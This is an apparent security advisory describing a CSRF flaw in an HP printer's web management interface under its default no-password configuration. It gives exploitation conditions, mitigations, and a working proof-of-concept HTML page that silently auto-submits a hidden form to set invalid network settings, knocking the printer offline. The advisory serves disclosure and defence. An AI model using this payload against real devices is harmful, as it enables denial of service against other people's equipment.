Details:

      Default configuration for the device does not require user to
      define password for configuration changes.

      Insecure out-of-the-box configuration combined with CSRF
      vulnerability in web management interface allows attacker to
      perform unwanted configuration changes through user's browser.

      Successful exploitation requires:
      1) Out-of-the-box configuration (no management password)
      2) Internal user with access to web management interface
      3) Knowledge of target printer's DNS name or IP address
      4) Ability to lure internal user to a malicious website or
         ability to inject malicious HTML/javascript to website
         frequented by said internal user.

      Simplest management interfaces contains few interesting
      features, most significant impact can be achieved with invalid
      network configuration. This results in denial-of-service
      condition, requiring manual reconfiguration in order to
      restore network connectivity.

      More advanced management interfaces based on the some software
      may contain additional features suitable for exploitation.
      It is recommended to check the features of management interface
      in order to determine the actual risk for the used product.

Mitigation:

      1) Set administrator password
      2) Do not browse untrusted sites while logged on to the
         management interface

Proof of Concept:

<html>
<head><title>Network</title></head>
<body onload="document.CSRF.submit();">
<FORM name="CSRF" method="post"  
ACTION="http://1.2.3.4/hp/device/config_result_YesNo.html/config";  
style="display:none">
<input name="Clear" value="Yes">
<input name="Menu" value="NetIPChange">
<input name="Configuration"  
value="IPConfig=Man&amp;IPAddr=1.1.1.1&amp;SN=2.2.2.2&amp;GW=3.3.3.3&amp;WINS=0.0.0.0">
</form>
</body>
</html>

Invalid value for "Configuration" parameter sets IP, mask and gw to  
255.255.255.255
